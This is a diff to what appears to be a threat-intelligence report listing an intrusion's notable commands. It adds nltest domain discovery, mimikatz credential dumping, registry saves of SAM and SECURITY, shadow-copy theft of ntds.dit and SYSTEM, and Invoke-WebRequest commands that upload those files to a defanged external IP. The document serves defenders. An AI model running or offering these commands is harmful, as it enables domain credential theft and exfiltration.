@@ -64,9 +64,23 @@ SHA-256:
 
 Notable Commands:
 
+# Discovery
+
+nltest /dsgetdc:<domain>
+nltest /server:<dc> /sc_query:<domain>
+
 # Credential Theft
 
 C:\Users\Public\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" 
+reg save HKLM\SAM C:\Windows\Temp\SAM /y
+reg save HKLM\SECURITY C:\Windows\Temp\SECURITY /y
+reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" 2>&1
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<id>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<id>\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
+Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SAM" -Method PUT -InFile "C:\Windows\Temp\SAM" -UseBasicParsing -TimeoutSec 30
+Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SECURITY" -Method PUT -InFile "C:\Windows\Temp\SECURITY" -UseBasicParsing -TimeoutSec 30
+Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SYSTEM" -Method PUT -InFile "C:\Windows\Temp\SYSTEM" -UseBasicParsing -TimeoutSec 60
+Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/ntds.dit" -Method PUT -InFile "C:\Windows\Temp\ntds.dit" -UseBasicParsing -TimeoutSec 300
 
 # Ransomware deployment via scheduled tasks; runs locker.exe
 
